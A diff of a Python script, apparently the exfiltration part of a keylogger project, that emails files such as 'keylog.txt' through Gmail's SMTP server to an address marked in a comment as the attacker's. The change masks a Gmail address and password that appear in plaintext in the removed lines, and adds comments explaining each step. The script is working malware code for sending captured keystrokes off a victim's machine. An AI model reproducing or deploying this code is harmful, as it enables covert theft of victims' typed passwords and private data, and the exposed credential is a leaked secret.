@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# import statements
+# import libaries for sending emails
 import smtplib
 from email import encoders
 from email.mime.text import MIMEText
@@ -11,7 +11,7 @@ files_to_send = [
     "keylog.txt",
 ]
 
-
+# function to initiate connection to SMTP server
 def send_mail(email, password, TO, msg):
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
@@ -20,13 +20,13 @@ def send_mail(email, password, TO, msg):
     server.quit()
 
 # change these to attacker email/password
-email = "keyloggtester4@gmail.com"
-password = "Kalibox123?"
+email = "k**********4@gmail.com"
+password = "K********?"
 
-TO   = "keyloggtester4@gmail.com"
-subject = "subject"
+TO   = "k**********4@gmail.com"
+subject = ""
 
-# edit the text field and insert a document to be the body of the email
+# edit the text field and insert into body of email
 msg = MIMEMultipart()
 msg["From"] = email
 msg["To"] = TO
@@ -34,6 +34,7 @@ msg["Subject"] = subject
 text = ""
 msg.attach(MIMEText(text, "plain"))
 
+# attaches file to the email 
 for file in files_to_send:
     with open(file, "rb") as f:
         data = f.read()
